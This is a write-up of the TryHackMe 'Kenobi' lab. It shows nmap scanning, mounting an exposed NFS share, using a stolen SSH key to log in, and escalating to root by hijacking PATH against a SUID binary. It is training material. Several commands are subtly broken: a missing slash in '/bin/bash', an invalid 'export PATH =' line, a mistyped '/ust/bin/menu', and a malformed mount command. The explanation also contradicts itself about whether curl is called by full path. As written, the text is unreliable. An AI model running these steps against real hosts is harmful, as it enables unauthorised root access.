# TryHackMe - Kenobi Write-Up

## *1. Overview*
- *Target Machine:* Kenobi (TryHackMe)
- *Objective:* Gain root access and retrieve the flag.
- *Techniques Used:* Enumeration, NFS Exploitation, Privilege Escalation.

---

## *2. Enumeration*
### *2.1 - Nmap Scan*
First, I ran a full port scan using nmap:  


nmap -sC -sV -p- -oN scan.txt 10.10.73.74


Findings :





![Image](https://github.com/user-attachments/assets/175fc8e7-85e4-4ebb-bc50-fdcf8717a52b)

## 3. Exploitation

### 3.1 - Exploiting NFS

bash


showmount -e 10.10.73.74



•	Found /var directory as a shared NFS mount.


•	Mounted the share on my local

bash



 sudo mount -o nolock 10.10.73.74 :/var /mnt


 •	Discovered a private SSH key in /mnt/.ssh/id_rsa.

 ### 3.2 - Gaining initial access

 bash


 chmod 600 id_rsa

 
ssh -i id_rsa kenobi@10.10.73.74


•	Logged in as kenobi user.


## 4. Privilege Escalation

### 4.1 - Finding a SUID Binary
I searched for SUID binaries (executables that run as root):


bash


find / -perm -4000 2>/dev/null


Found:

bash 

/usr/bin/menu

This binary was SUID-root, meaning it could be exploited for privilege escalation.


## 4.2- Exploiting the SUID Binary

I ran strings to check how the menu binary works:


bash


strings /usr/bin/menu


Found this :


bash 


/usr/bin/curl 


This meant the binary was calling curl without specifying the full path. Since we can modify the PATH variable, we could replace curl with a malicious script.



Privilage Escalation via PATH Hijacking 

1. Created a fake curl script

   bash

   echo "bin/bash" > curl

   chmod +x curl

2. Modified the PATH

   bash

   export PATH =/tmp:$PATH


3. Ran the vulnerable binary:


   bash

   /ust/bin/menu


   THIS GAVE ME ROOT SHELL !




 ## 5.PROOF OF COMPROMISE 

 with root access, i retrived the final flag:


 bash 


 cat/root/root.txt



 ## Lesson Learned

 . NFS MISCONFIGURATIONS can expose sensitive files 

 . SUID binaries should be monitored to prevent privilege escalation 

 . PATH hijacking is common way to escalate privilages in misconfiguration systems.


 ## SCREENSHOTS 


 ![Image](https://github.com/user-attachments/assets/84335b5e-c053-4147-bfa9-5da20c7515b5)


 ![Image](https://github.com/user-attachments/assets/1c16ae9b-d7dd-4ecd-995b-d548c38331a5)





   














